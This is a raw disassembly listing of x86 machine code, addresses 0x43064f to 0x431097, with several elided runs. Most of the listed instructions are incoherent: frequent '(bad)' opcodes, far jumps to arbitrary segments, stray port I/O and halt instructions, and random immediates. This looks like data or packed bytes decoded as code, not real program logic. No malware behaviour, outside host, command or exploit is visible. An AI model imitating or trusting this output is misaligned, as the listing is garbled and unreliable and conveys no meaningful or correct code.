  43064f:	or     edi,0xad1effb8
  430655:	sub    eax,DWORD PTR [edi]
  430657:	(bad)  
  430658:	jmp    0x88a3:0xc9cbc43d
  43065f:	jns    0x4305fa
  430661:	push   ss
  430662:	mov    ebp,0x63303c66
  430667:	das    
  430668:	jns    0x430688
  43066a:	(bad)  
  43066b:	mov    ch,0x4b
  43066d:	cmp    eax,0x2ec5229e
  430672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430673:	mov    esi,0x7b783a8b
  430678:	dec    ecx
  430679:	(bad)  
  43067a:	sbb    BYTE PTR ds:0xb6aa879a,dl
  430680:	cmc    
  430681:	loop   0x4306e3
  430683:	(bad)  
  430684:	hlt    
  430685:	repnz add DWORD PTR fs:[ebx],0xffffff91
  43068a:	stos   DWORD PTR es:[edi],eax
  43068b:	lahf   
  43068c:	push   0x4915c94f
  430691:	lea    esi,[edx+0x153b93]
  430697:	mov    ebp,0x171d46ce
  43069c:	mov    edi,0x570ec127
  4306a1:	mov    dl,dl
  4306a3:	cmp    al,0x5c
  4306a5:	jmp    0x430700
  4306a7:	sub    al,0x3f
  4306a9:	addr16 pop ecx
  4306ab:	jmp    0x43069e
  4306ad:	ds mov al,0x19
  4306b0:	pop    edx
  4306b1:	push   es
  4306b2:	imul   ecx,DWORD PTR [esi-0xb562cfa],0x2165e184
  4306bc:	dec    edx
  4306bd:	push   es
  4306be:	pusha  
  4306bf:	fsub   QWORD PTR [edi]
  4306c1:	pop    ebp
	...
  430732:	add    BYTE PTR [eax],al
  430734:	jno    0x4306d7
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0xb2
  430741:	pop    ebx
  430742:	xchg   DWORD PTR [ebx],ebp
  430744:	adc    BYTE PTR [eax],al
  430746:	add    al,BYTE PTR [eax]
  430748:	test   BYTE PTR [eax],0x0
  43074b:	add    BYTE PTR [edx+eax*1-0x35],ch
  43074f:	pushf  
  430750:	and    bl,dl
  430752:	stos   DWORD PTR es:[edi],eax
  430753:	(bad)  
  430754:	std    
  430755:	in     eax,0x9b
  430757:	xor    BYTE PTR [esi-0x2c],ah
  43075a:	lds    edi,FWORD PTR [edi+0x63655a5d]
  430760:	sbb    eax,0xd32d6098
  430765:	mov    bl,0xf4
  430767:	je     0x430786
  430769:	out    0x2c,al
  43076b:	aas    
  43076c:	xor    esp,DWORD PTR [ebx*8+0x58ae1b86]
  430773:	or     al,0x3f
  430775:	(bad)  
  430776:	push   ebp
  430777:	sbb    DWORD PTR [ebp-0x1fd7234d],edx
  43077d:	pushw  0xffc2
  430780:	in     eax,0x90
  430782:	xchg   ebp,eax
  430783:	add    cl,BYTE PTR [edi-0x77]
  430786:	mov    eax,DWORD PTR [ecx+eax*1-0x2921da4c]
  43078d:	daa    
  43078e:	in     eax,0xf8
  430790:	mov    esp,0x4558ddbd
  430795:	mov    ah,0xc3
  430797:	pop    edi
  430798:	adc    ah,dh
  43079a:	outs   dx,DWORD PTR ds:[esi]
  43079b:	das    
  43079c:	jle    0x430756
  43079e:	and    esi,edi
  4307a0:	mov    ds:0x3e6581e0,eax
  4307a5:	mov    ebx,0xa77f58fe
  4307aa:	aas    
  4307ab:	lahf   
  4307ac:	jns    0x4307d6
  4307ae:	push   ecx
  4307af:	jae    0x430786
  4307b1:	jbe    0x4307b7
  4307b3:	scas   eax,DWORD PTR es:[edi]
  4307b4:	test   DWORD PTR [ecx],eax
  4307b6:	sbb    bh,bl
  4307b8:	js     0x43078f
  4307ba:	mov    dl,0xc2
  4307bc:	jmp    0x4307fd
  4307be:	pop    esp
  4307bf:	das    
  4307c0:	adc    cl,ah
  4307c2:	jns    0x4307e9
  4307c4:	loop   0x430839
  4307c6:	rcr    BYTE PTR [edx-0x7618f0e7],1
  4307cc:	sub    esi,DWORD PTR [edi-0x5eb5b8f7]
  4307d2:	cmp    ebx,ecx
  4307d4:	inc    esp
  4307d5:	mov    ah,0xe7
  4307d7:	enter  0x3924,0x8b
  4307db:	ins    BYTE PTR es:[edi],dx
  4307dc:	popf   
  4307dd:	ror    DWORD PTR [ebp+0x306c59fb],0x39
  4307e4:	cmp    al,0x80
  4307e6:	mov    esi,0x354bfca
  4307eb:	push   esp
  4307ec:	pop    ebp
  4307ed:	sbb    ch,bl
  4307ef:	sar    DWORD PTR [edi],1
  4307f1:	popa   
  4307f2:	xor    DWORD PTR [esi-0x5a],edi
  4307f5:	stos   BYTE PTR es:[edi],al
  4307f6:	sbb    eax,0xeaaaf611
  4307fb:	xor    esi,0xffffffdb
  4307fe:	sbb    BYTE PTR [esp+esi*4],0x6b
  430802:	popa   
  430803:	clc    
  430804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430805:	(bad)  
  430806:	sub    dl,bh
  430808:	pop    esi
  430809:	or     eax,0xdd420b50
  43080e:	aam    0x74
  430810:	imul   esp,DWORD PTR [esp+ecx*4],0x19
  430814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430815:	icebp  
  430816:	xor    al,0x6e
  430818:	setnp  BYTE PTR cs:[ebp+0x27]
  43081d:	je     0x4307dd
  43081f:	add    ch,BYTE PTR [ebx+0x3ac0aef]
  430825:	adc    BYTE PTR [eax-0x23d98e3e],al
  43082b:	data16 add BYTE PTR [ecx+ebp*8-0x2da920c6],cl
  430833:	sub    BYTE PTR [edi],dh
  430835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430836:	sub    al,0x6e
  430839:	mov    dh,bl
  43083b:	jmp    0x43083a
  43083d:	push   eax
  43083e:	addr16 das 
  430840:	cli    
  430841:	xor    eax,DWORD PTR [eax]
	...
  4308b3:	add    BYTE PTR [esp+esi*2],dl
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	leave  
  4308c1:	in     eax,dx
  4308c2:	mov    dh,0xc4
  4308c4:	push   es
  4308c5:	add    DWORD PTR [edx],eax
  4308c7:	add    dh,dh
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    BYTE PTR [ebp-0x34],ah
  4308ce:	or     bl,BYTE PTR [eax]
  4308d0:	icebp  
  4308d1:	loope  0x430951
  4308d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4308d4:	jg     0x4308ed
  4308d6:	(bad)  
  4308d7:	pop    ss
  4308d8:	cmp    DWORD PTR [eax],edi
  4308da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4308db:	mov    eax,ds:0x5869a123
  4308e0:	jmp    0x4308a5
  4308e2:	imul   ecx
  4308e4:	fisub  DWORD PTR [ebx-0x3]
  4308e7:	call   0xb42bb720
  4308ec:	sub    bl,BYTE PTR [ecx]
  4308ee:	aaa    
  4308ef:	or     dh,BYTE PTR [ebx+0x4e089c7e]
  4308f5:	push   esi
  4308f6:	cmp    ah,0x77
  4308f9:	xchg   esp,ebx
  4308fb:	mov    edx,0xbba74291
  430900:	inc    ebp
  430901:	pop    ecx
  430902:	jnp    0x43096b
  430904:	cmp    al,0x72
  430906:	lds    ebp,FWORD PTR [ebx+0x35]
  430909:	in     eax,0xa0
  43090b:	aas    
  43090c:	jns    0x43094f
  43090e:	sbb    BYTE PTR [edx+0x3394ec91],cl
  430914:	jl     0x4308fe
  430916:	xor    BYTE PTR [ebp+0x20523c6c],al
  43091c:	pop    edi
  43091d:	repz test DWORD PTR [ecx-0x11397e12],0x3fa9710a
  430928:	mov    edx,ebp
  43092a:	pushf  
  43092b:	loopne 0x430925
  43092d:	push   ecx
  43092e:	test   al,0x6b
  430930:	pushf  
  430931:	adc    edi,esi
  430933:	call   FWORD PTR [edi-0x1e461837]
  430939:	repnz popf 
  43093b:	fmul   QWORD PTR [esi]
  43093d:	add    BYTE PTR [eax+0x7f],0x30
  430941:	sub    al,0x59
  430943:	mov    eax,ds:0x5dbf9b33
  430948:	sar    bl,1
  43094a:	icebp  
  43094b:	cmc    
  43094c:	mov    dh,0x2b
  43094e:	inc    esi
  43094f:	jae    0x4308eb
  430951:	lea    ebx,[edi]
  430953:	push   esi
  430954:	fadd   DWORD PTR [edi-0x70]
  430957:	shl    ecx,0xee
  43095a:	std    
  43095b:	into   
  43095c:	pop    ebx
  43095d:	inc    edx
  43095e:	xchg   edi,eax
  43095f:	outs   dx,DWORD PTR ds:[esi]
  430960:	push   ebx
  430961:	and    eax,0xfc83493
  430966:	push   ecx
  430967:	loop   0x4309a8
  430969:	cwde   
  43096a:	lods   eax,DWORD PTR ds:[esi]
  43096b:	push   ecx
  43096c:	cmp    BYTE PTR [ebp+0x397b91c3],dh
  430972:	lea    esi,[esi]
  430974:	mov    ah,0x8d
  430976:	rol    BYTE PTR [ecx],1
  430978:	test   eax,0x490a4687
  43097d:	jo     0x4309f1
  43097f:	mov    ebx,DWORD PTR [eax]
  430981:	mov    edx,0x15c91a06
  430986:	sbb    esi,DWORD PTR [eax]
  430988:	cmp    ebx,DWORD PTR [eax-0x1b4236b3]
  43098e:	xor    DWORD PTR [ebx],0xfffffff5
  430991:	pop    ebx
  430992:	jge    0x4309d6
  430994:	and    al,0x83
  430996:	mov    eax,ds:0xa66227c9
  43099b:	rcr    BYTE PTR [ecx],1
  43099d:	sub    dl,ah
  43099f:	push   esi
  4309a0:	jg     0x43093a
  4309a2:	cmp    eax,esp
  4309a4:	cmp    al,0xb2
  4309a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309a7:	jae    0x4309c8
  4309a9:	jae    0x43094a
  4309ab:	lds    esp,FWORD PTR [edx-0x2b]
  4309ae:	dec    edi
  4309af:	fs pop ds
  4309b1:	mov    edx,0x876fcbc9
  4309b6:	push   ds
  4309b7:	jns    0x430994
  4309b9:	jb     0x430a24
  4309bb:	lea    edx,[ebx-0x20c993a7]
  4309c1:	mov    al,BYTE PTR [eax]
	...
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x9272f137
  430a43:	aam    0xfc
  430a45:	add    DWORD PTR [edx],eax
  430a47:	add    dh,dh
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    BYTE PTR [esp+esi*4+0x54],dh
  430a4f:	jno    0x430a53
  430a51:	pop    ecx
  430a52:	xor    dl,dh
  430a54:	scas   al,BYTE PTR es:[edi]
  430a55:	jmp    0x430a6a
  430a57:	sub    al,BYTE PTR [eax-0x6298b455]
  430a5d:	mov    edi,0x5dac036a
  430a62:	add    al,0x8f
  430a64:	lods   eax,DWORD PTR ds:[esi]
  430a65:	fiadd  WORD PTR [edi+0x6a]
  430a68:	out    dx,al
  430a69:	imul   ecx,ebx,0x8b65b1e8
  430a6f:	mov    edi,0x812ccaf3
  430a74:	shl    esi,0xa1
  430a77:	sti    
  430a78:	stos   DWORD PTR es:[edi],eax
  430a79:	or     eax,0xf65e13bc
  430a7e:	daa    
  430a7f:	dec    ebp
  430a80:	pop    ebp
  430a81:	push   ss
  430a82:	mov    sp,0xc29f
  430a86:	jge    0x430a27
  430a88:	xchg   esi,eax
  430a89:	jp     0x430aef
  430a8b:	jle    0x430acb
  430a8d:	adc    DWORD PTR [eax],0x27
  430a90:	ret    
  430a91:	sbb    eax,0x6c9d27ab
  430a96:	sbb    esp,DWORD PTR [edi+0x41e083f9]
  430a9c:	cmp    ah,BYTE PTR [edx+0x2]
  430a9f:	sar    BYTE PTR [esp+ebp*1+0x7fe64b24],cl
  430aa6:	int3   
  430aa7:	adc    DWORD PTR [ecx],ebp
  430aa9:	mov    ecx,0xf890a005
  430aae:	xchg   esp,eax
  430aaf:	cwde   
  430ab0:	into   
  430ab1:	sub    al,0x1a
  430ab3:	adc    BYTE PTR [esi+edi*8-0x7645896c],ah
  430aba:	pop    esi
  430abb:	sti    
  430abc:	cmp    eax,0x8009a810
  430ac1:	leave  
  430ac2:	loope  0x430acc
  430ac4:	ins    DWORD PTR es:[edi],dx
  430ac5:	enter  0xbf9a,0x66
  430ac9:	les    ebp,FWORD PTR [edx+eiz*4-0x36]
  430acd:	pop    ecx
  430ace:	jns    0x430ac7
  430ad0:	(bad)  
  430ad1:	xchg   ecx,eax
  430ad2:	aad    0x9a
  430ad4:	jb     0x430b2c
  430ad6:	sbb    ch,BYTE PTR [esi+ebp*4+0x6a]
  430ada:	jmp    0x9025:0x201b3663
  430ae1:	and    eax,0x2028d935
  430ae6:	mov    bl,0x2c
  430ae8:	pop    edx
  430ae9:	cmp    eax,0x64af738
  430aee:	ds test eax,0x5772c75
  430af4:	pushf  
  430af5:	pop    ecx
  430af6:	jle    0x430a88
  430af8:	sbb    edi,ecx
  430afa:	jp     0x430b38
  430afc:	test   esp,ecx
  430afe:	outs   dx,DWORD PTR ds:[esi]
  430aff:	je     0x430ab2
  430b01:	std    
  430b02:	mov    esi,es
  430b04:	adc    eax,esi
  430b06:	adc    eax,0xdbcad7d7
  430b0b:	adc    al,0x26
  430b0d:	pushf  
  430b0e:	ret    0xc4b7
  430b11:	dec    ecx
  430b12:	(bad)  
  430b13:	pop    ss
  430b14:	ret    
  430b15:	push   esi
  430b16:	aaa    
  430b17:	aaa    
  430b18:	pop    edx
  430b19:	mov    ds:0xa339bb13,eax
  430b1e:	std    
  430b1f:	sub    esi,ecx
  430b21:	or     al,0x40
  430b23:	cwde   
  430b24:	repnz and BYTE PTR [eax],al
  430b27:	(bad)  
  430b28:	mov    ecx,0xb2de47d
  430b2d:	jb     0x430b44
  430b2f:	leave  
  430b30:	mov    ah,0x6c
  430b32:	test   al,0x69
  430b34:	push   ss
  430b35:	ror    BYTE PTR [edi-0x26722ef],cl
  430b3b:	add    esi,DWORD PTR [edi+0x59]
  430b3e:	loop   0x430ae9
  430b40:	sbb    BYTE PTR [eax],ah
	...
  430bb2:	add    BYTE PTR [eax],al
  430bb4:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  430bba:	mov    ebx,0x4217e69a
  430bbf:	aas    
  430bc0:	xlat   BYTE PTR ds:[ebx]
  430bc1:	or     al,0x9
  430bc3:	(bad)  
  430bc5:	add    al,BYTE PTR [edx]
  430bc7:	add    dh,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    dl,bh
  430bcd:	xchg   ecx,eax
  430bce:	xchg   ebx,eax
  430bcf:	mov    dl,0x8e
  430bd1:	pop    esp
  430bd2:	(bad)  
  430bd3:	push   ds
  430bd4:	inc    esp
  430bd5:	push   es
  430bd6:	mov    al,0x6f
  430bd8:	in     eax,0x93
  430bda:	fisttp WORD PTR [eax-0x65]
  430bdd:	jb     0x430be8
  430bdf:	jge    0x430c5b
  430be1:	lods   al,BYTE PTR ds:[esi]
  430be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430be3:	inc    eax
  430be4:	push   ebx
  430be5:	leave  
  430be6:	pop    ebx
  430be7:	out    dx,eax
  430be8:	inc    eax
  430be9:	xlat   BYTE PTR ds:[ebx]
  430bea:	(bad)  
  430bec:	add    al,0xc
  430bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430bef:	sbb    al,0x6b
  430bf1:	shl    cl,cl
  430bf3:	add    ch,BYTE PTR [edx]
  430bf5:	test   BYTE PTR [edi-0x7a3d88fc],ah
  430bfb:	dec    ebp
  430bfc:	pushf  
  430bfd:	fldcw  WORD PTR [esi-0x32ae5734]
  430c03:	mov    ch,0x69
  430c05:	and    DWORD PTR [ecx+eax*4-0x34],edi
  430c09:	js     0x430c21
  430c0b:	inc    esi
  430c0c:	dec    edx
  430c0d:	out    dx,al
  430c0e:	addr16 clc 
  430c10:	jle    0x430c6c
  430c12:	xor    ebp,DWORD PTR [eax+0x1b]
  430c15:	pop    ds
  430c16:	push   esp
  430c17:	shl    eax,0xfe
  430c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c1b:	jmp    FWORD PTR [eax-0x60037e52]
  430c21:	and    bl,ah
  430c23:	mov    esp,DWORD PTR [edi-0x1e]
  430c26:	stc    
  430c27:	int    0x99
  430c29:	les    edi,FWORD PTR [edi+0x39b311e8]
  430c2f:	addr16 inc eax
  430c31:	pusha  
  430c32:	lea    edx,[edx-0xc]
  430c35:	sub    eax,0x4a6d1db6
  430c3a:	out    0x7c,al
  430c3c:	dec    ecx
  430c3d:	pusha  
  430c3e:	and    ebp,DWORD PTR ds:0xff23288
  430c44:	sub    BYTE PTR [eax+0x484e019e],al
  430c4a:	or     ecx,DWORD PTR [esi-0x26]
  430c4d:	call   0xc6da29fb
  430c52:	xchg   BYTE PTR [eax],al
  430c54:	jns    0x430c9e
  430c56:	xor    DWORD PTR [esi],ebp
  430c58:	in     eax,dx
  430c59:	xor    DWORD PTR [edi],eax
  430c5b:	test   DWORD PTR [ebx+eiz*1-0x3ba6968a],esp
  430c62:	add    DWORD PTR [ebx+0x63],edi
  430c65:	push   cs
  430c66:	clc    
  430c67:	aad    0x5
  430c69:	mov    DWORD PTR [esi-0x2f373626],edx
  430c6f:	dec    edx
  430c70:	(bad)  
  430c71:	add    al,BYTE PTR [ecx+0x23]
  430c74:	nop
  430c75:	int3   
  430c76:	sbb    edx,DWORD PTR [edi]
  430c78:	xchg   edx,eax
  430c79:	xchg   ebx,eax
  430c7a:	add    BYTE PTR [eax-0x29],cl
  430c7d:	xor    DWORD PTR [edx],ebx
  430c7f:	mov    edx,0x769dea45
  430c84:	xchg   ebx,eax
  430c85:	dec    ebx
  430c86:	into   
  430c87:	add    DWORD PTR [ebx-0x11],ebp
  430c8a:	sub    eax,0x35d2cce2
  430c8f:	imul   ebx,DWORD PTR [edi-0x76],0xf865ea6d
  430c96:	jl     0x430c29
  430c98:	rol    BYTE PTR [eax],cl
  430c9a:	imul   dl
  430c9c:	dec    ebp
  430c9d:	xor    BYTE PTR [edi-0x15182a99],cl
  430ca3:	and    al,0x9a
  430ca5:	xlat   BYTE PTR ds:[ebx]
  430ca6:	xchg   edx,eax
  430ca7:	arpl   WORD PTR [ecx*8+0x2573e80d],ax
  430cae:	bound  ebx,QWORD PTR [ecx+0x7bde3226]
  430cb4:	pop    esi
  430cb5:	adc    eax,0xa26b55cf
  430cba:	cli    
  430cbb:	pop    esp
  430cbc:	ret    
  430cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430cbe:	int    0xe8
  430cc0:	cmp    DWORD PTR [eax+eax*1+0x0],ecx
	...
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430ce4
  430d41:	fst    DWORD PTR cs:[edx-0x18]
  430d45:	add    eax,DWORD PTR [edx]
  430d47:	add    dh,dh
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [esi-0x2e55c13],dh
  430d51:	xchg   DWORD PTR [ebx],ebx
  430d53:	jmp    0x49015321
  430d58:	in     al,0x83
  430d5a:	cmp    dh,BYTE PTR [edi-0x24280193]
  430d60:	fadd   DWORD PTR [ecx-0x755c8e23]
  430d66:	pop    edi
  430d67:	lea    ebx,[edi-0x36c5a463]
  430d6d:	out    dx,al
  430d6e:	adc    bl,ch
  430d70:	rcl    BYTE PTR [ebp+0x23],cl
  430d73:	ss xor al,0x77
  430d76:	std    
  430d77:	or     eax,0xd7f76c8c
  430d7c:	dec    eax
  430d7d:	rcl    al,1
  430d7f:	call   0xd9be4dd2
  430d84:	ror    BYTE PTR [ebp-0x1064d233],0x51
  430d8b:	pop    DWORD PTR [esi+0x79]
  430d8e:	add    esp,ecx
  430d90:	mov    bl,0x58
  430d92:	pop    ebx
  430d93:	(bad)  ds:[edx+eax*4-0x80]
  430d98:	scas   al,BYTE PTR es:[edi]
  430d99:	lea    ebx,[ebx+0x6d19b381]
  430d9f:	outs   dx,DWORD PTR ds:[esi]
  430da0:	ds lahf 
  430da2:	mov    dl,0xe9
  430da4:	pop    eax
  430da5:	mov    bl,0x90
  430da7:	les    edx,FWORD PTR [edx]
  430da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430daa:	xor    BYTE PTR [ecx+0x2b47aa8b],bl
  430db0:	in     eax,dx
  430db1:	mov    esi,0xfad5df98
  430db6:	sbb    DWORD PTR [edx-0x3515bfab],0xc121c069
  430dc0:	sbb    bl,ch
  430dc2:	push   esp
  430dc3:	cli    
  430dc4:	inc    edx
  430dc5:	and    dl,ch
  430dc7:	imul   ebx,DWORD PTR [edx-0x44],0x52
  430dcb:	and    esi,DWORD PTR [edi]
  430dcd:	je     0x430d69
  430dcf:	test   eax,0x2a205ba9
  430dd4:	push   edx
  430dd5:	push   ebx
  430dd6:	jbe    0x430e14
  430dd8:	jmp    0xdc6b:0x7e7c4be2
  430ddf:	das    
  430de0:	out    0x8a,eax
  430de2:	in     eax,dx
  430de3:	pusha  
  430de4:	and    dh,BYTE PTR [esi+ebx*2]
  430de7:	inc    edi
  430de8:	ins    BYTE PTR es:[edi],dx
  430de9:	ins    BYTE PTR es:[edi],dx
  430dea:	and    BYTE PTR [eax],0x63
  430ded:	loope  0x430e59
  430def:	(bad)  [esi+0x3f]
  430df2:	cmp    DWORD PTR [eax+ebp*1],0x61
  430df6:	jns    0x430e39
  430df8:	pop    esp
  430df9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430dfa:	pop    esi
  430dfb:	mov    ah,0x8a
  430dfd:	add    edi,esi
  430dff:	mov    edx,DWORD PTR [edi-0x24cbd0f9]
  430e05:	mov    ch,0x80
  430e07:	cld    
  430e08:	jno    0x430e44
  430e0a:	jmp    0x430e3b
  430e0c:	ss mov eax,0x64c6ffa8
  430e12:	sbb    eax,0xc28e48d5
  430e17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430e18:	dec    esp
  430e19:	ins    BYTE PTR es:[edi],dx
  430e1a:	fisubr DWORD PTR ds:0x8fc6c37e
  430e20:	xlat   BYTE PTR ds:[ebx]
  430e21:	addr16 enter 0xd82b,0x71
  430e26:	push   ebp
  430e27:	loopne 0x430ea4
  430e29:	imul   ebx,DWORD PTR [edi],0xe9fb37a1
  430e2f:	mov    WORD PTR [ecx],?
  430e31:	in     al,0x32
  430e33:	xor    al,0x78
  430e35:	push   0x485be33e
  430e3a:	pop    edi
  430e3b:	jecxz  0x430e79
  430e3d:	xor    eax,0xc830338d
	...
  430eb2:	add    BYTE PTR [eax],al
  430eb4:	add    al,0x67
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430e5e
  430ec1:	in     al,dx
  430ec2:	mov    ah,0x4b
  430ec4:	fiadd  WORD PTR [edx+eax*1]
  430ec7:	add    BYTE PTR [ebx+0x0],ah
  430eca:	add    BYTE PTR [eax],al
  430ecc:	push   edi
  430ecd:	sbb    BYTE PTR [esi-0x4e756040],al
  430ed3:	mov    ebx,0xbbec9fd9
  430ed8:	ss mov ch,0x30
  430edb:	cmp    al,0xa3
  430edd:	std    
  430ede:	retf   
  430edf:	and    bh,bl
  430ee1:	push   ebx
  430ee2:	xchg   DWORD PTR [esi-0x3ac2cfe3],ebx
  430ee8:	xchg   ebx,eax
  430ee9:	sbb    eax,0x777b589f
  430eee:	xor    al,0xba
  430ef0:	inc    ebp
  430ef1:	and    dl,bl
  430ef3:	(bad)
  430ef8:	mov    ds:0x622809d8,al
  430efd:	fld    QWORD PTR ds:[edx+edx*8-0x65565f67]
  430f05:	or     DWORD PTR [ebx+0x21],edx
  430f08:	mov    al,ds:0x7829d563
  430f0d:	in     eax,dx
  430f0e:	mov    ds:0x7c7ff519,al
  430f13:	xchg   ebp,eax
  430f14:	outs   dx,DWORD PTR ds:[esi]
  430f15:	mov    al,ds:0xcea53d20
  430f1a:	or     cl,ch
  430f1c:	mov    ds:0xa327aeea,eax
  430f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430f22:	and    esp,DWORD PTR [esi]
  430f24:	dec    DWORD PTR [eax+esi*4]
  430f27:	jge    0x430f38
  430f29:	sub    ah,BYTE PTR [edi+0x1b6f9d7]
  430f2f:	add    BYTE PTR [eax],al
  430f31:	add    BYTE PTR [eax],al
  430f33:	add    BYTE PTR [ebp+0x55],cl
  430f36:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  430f3c:	mov    esp,ebp
  430f3e:	or     al,ah
  430f40:	dec    ebp
  430f41:	add    bh,al
  430f43:	add    BYTE PTR [eax],cl
  430f45:	add    BYTE PTR [eax],al
  430f47:	mov    DWORD PTR [eax],0x3ef44545
  430f4d:	add    BYTE PTR ss:[ebp-0x70b6375],al
  430f54:	retf   
  430f55:	(bad)  
  430f56:	enter  0x4d45,0xb8
  430f5a:	mov    edi,DWORD PTR [ecx]
  430f5c:	hlt    
  430f5d:	test   ebx,ecx
  430f5f:	pushf  
  430f60:	enter  0x4df8,0x8b
  430f64:	mov    DWORD PTR [ebp+0x8],0x894708
  430f6b:	inc    ebp
  430f6c:	mov    ebp,0xff8bfffc
  430f71:	dec    ebp
  430f72:	mov    ch,0xf4
  430f74:	call   DWORD PTR [ebx-0x1]
  430f77:	mov    ebx,0x8005122
  430f7c:	call   DWORD PTR [ecx+0x8]
  430f7f:	pop    es
  430f80:	jmp    0xb8:0x9cb4533
  430f87:	cdq    
  430f88:	mov    esi,DWORD PTR [edx-0xc]
  430f8b:	xor    al,bl
  430f8d:	add    BYTE PTR [ecx+0x3c83203],bl
  430f93:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  430f99:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430f9f:	xor    eax,DWORD PTR [eax]
  430fa1:	retf   
  430fa2:	ret    
  430fa3:	add    eax,esi
  430fa5:	enter  0x8945,0x64
  430fa9:	dec    ebp
  430faa:	sbb    ah,cl
  430fac:	add    BYTE PTR [ebx-0xb87b277],cl
  430fb2:	dec    DWORD PTR [ebx-0xbcfb275]
  430fb8:	test   DWORD PTR [ebx],esi
  430fba:	dec    ebx
  430fbc:	inc    DWORD PTR [ebx]
  430fbe:	inc    eax
  430fbf:	enter  0x8989,0x64
  430fc3:	(bad)  
  430fc4:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  430fc8:	cld    
  430fc9:	dec    DWORD PTR [ebp-0xa90001]
  430fcf:	push   edi
  430fd0:	mov    BYTE PTR [edx+0x1],ch
  430fd3:	and    BYTE PTR [eax],al
  430fd5:	pop    ecx
  430fd6:	inc    ebp
  430fd7:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  430fdd:	push   0xffffff89
  430fdf:	pop    ecx
  430fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430fe1:	dec    ebp
  430fe2:	add    BYTE PTR [ecx+0x45fc088b],cl
  430fe8:	jne    0x431032
  430fea:	lea    eax,[eax]
  430fec:	fs (bad) 
  430fee:	dec    DWORD PTR [eax]
  430ff0:	mov    DWORD PTR [eax],eax
  430ff2:	test   al,0x0
  430ff4:	add    BYTE PTR [ebp-0x18],cl
  430ff7:	xor    ebp,DWORD PTR [edx]
  430ff9:	add    eax,DWORD PTR [eax]
  430ffb:	mov    eax,eax
  430ffd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431004:	inc    ebp
  431005:	mov    DWORD PTR [ebx+0x459408],ecx
  43100b:	popa   
  43100c:	mov    esp,DWORD PTR [ebp-0x75]
  43100f:	(bad)  
  431010:	cld    
  431011:	inc    eax
  431012:	cmp    bh,0x1
  431015:	lea    eax,[eax]
  431017:	and    BYTE PTR [eax],al
  431019:	inc    DWORD PTR [ecx-0x18]
  43101c:	mov    ecx,DWORD PTR [ebx]
  43101e:	cld    
  43101f:	add    BYTE PTR [ecx+0x75014d],cl
  431025:	(bad)  
  431026:	xchg   ebp,eax
  431027:	sar    bh,1
  431029:	inc    eax
  43102a:	inc    DWORD PTR [eax]
  43102c:	mov    eax,DWORD PTR [ebp-0x4]
  43102f:	xor    edx,DWORD PTR [edx+0x7201be]
  431035:	add    BYTE PTR [edx],dl
  431037:	(bad)  
  431038:	nop
  431039:	inc    ebp
  43103a:	add    BYTE PTR [ebx-0x5afb0c00],cl
  431040:	mov    al,0xff
  431042:	add    bh,bh
  431044:	add    BYTE PTR [ebx],dh
  431046:	inc    DWORD PTR [ebx]
  431048:	sbb    al,0x89
  43104a:	jne    0x431028
  43104c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  431052:	mov    eax,DWORD PTR [ebp-0xff0048]
  431058:	mov    DWORD PTR [eax-0x70],0xe870e989
  43105f:	inc    DWORD PTR [ebp-0x75]
  431062:	(bad)  [esi+ebp*8]
  431065:	test   DWORD PTR [esi-0x1],esp
  431068:	inc    ebp
  431069:	(bad)  
  43106a:	aas    
  43106b:	inc    ebp
  43106c:	(bad)  
  43106d:	lea    edi,[eax+edi*2-0x1]
  431071:	inc    edi
  431073:	mov    DWORD PTR [ecx],edi
  431075:	mov    al,ds:0x8b8000c7
  43107a:	call   0x45d0f37b
  43107f:	(bad)  
  431080:	out    dx,al
  431081:	(bad)  
  431082:	fisttp WORD PTR [eax+0x8801c7]
  431088:	jecxz  0x4310cf
  43108a:	call   0xe83f568e
  43108f:	lea    edi,[edi]
  431091:	(bad)  
  431092:	call   0xcb3b96
  431097:	add    DWORD PTR [ebx-0x7f570400],ecx
